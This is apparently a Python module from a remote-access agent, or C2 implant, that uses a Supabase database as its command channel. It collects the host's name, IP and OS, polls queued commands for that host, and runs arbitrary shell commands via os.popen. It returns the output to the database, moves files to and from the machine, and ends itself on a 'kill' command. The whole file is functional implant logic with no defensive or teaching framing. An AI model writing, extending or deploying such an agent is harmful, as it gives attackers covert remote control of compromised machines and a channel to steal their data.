import os
import logging
from supabase import Client  # Import the Client class
from .commands import update_command_status, fetch_pending_commands_for_hostname
from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
from .system_info import get_system_info
from .config import SUPABASE_KEY

def handle_kill_command(command_id, command_text, hostname, supabase: Client):
    """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
    if command_text.strip().lower() == "kill":
        logging.info("Kill command received. Updating status and preparing to exit agent.")

        # Update the command status to 'Completed' and note that the agent is being terminated
        try:
            response = supabase.table('py2').update({
                'status': 'Completed',
                'output': 'Agent terminated'
            }).eq('id', command_id).execute()

            if response.data:
                logging.info("Command status updated successfully to 'Completed'.")
            else:
                logging.warning(f"Error updating command status: {response.json()}")  # Log error details

        except Exception as e:
            logging.error(f"Failed to update command status before termination: {e}")

        # Update the 'settings' table to mark the agent as 'Dead'
        try:
            response = supabase.table('settings').update({
                'check_in': 'Dead'
            }).eq('hostname', hostname).execute()

            if response.data:
                logging.info("Agent status updated successfully to 'Dead'.")
            else:
                logging.warning(f"Error updating agent status: {response.json()}")  # Log error details

        except Exception as e:
            logging.error(f"Failed to update agent status before termination: {e}")

        finally:
            logging.info("Shutdown sequence initiated.")
            os._exit(0)  # Force the agent to terminate

def execute_commands(supabase: Client):
    """Executes pending commands and handles file uploads/downloads."""

    hostname, ip, os_info = get_system_info()

    # Handle pending uploads
    pending_uploads_response = fetch_pending_uploads(supabase)
    if pending_uploads_response.data:
        for upload in pending_uploads_response.data:
            file_url = upload.get('file_url')
            remote_path = upload.get('remote_path')
            if file_url and remote_path:
                if download_from_supabase(file_url, remote_path, SUPABASE_KEY, supabase):
                    supabase.table("uploads").update({"status": "completed"}).eq("id", upload['id']).execute()
                else:
                    supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()

    # Handle other commands
    pending_commands_response = fetch_pending_commands_for_hostname(hostname, supabase)
    if pending_commands_response.data:
        for command in pending_commands_response.data:
            command_id = command['id']
            command_text = command['command']
            username = command.get('username', 'Unknown')

            # Handle kill command (this will exit the script if applicable)
            handle_kill_command(command_id, command_text, hostname, supabase)

            if command_text.lower().startswith('download'):
                status, output = handle_download_command(command_text, username, supabase)
            elif command_text.lower().startswith('upload'):
                status, output = handle_upload_command(command_text, username, supabase)
            else:
                try:
                    result = os.popen(command_text).read()
                    status = 'Completed'
                    output = result
                except Exception as e:
                    status = 'Failed'
                    output = str(e)
            update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
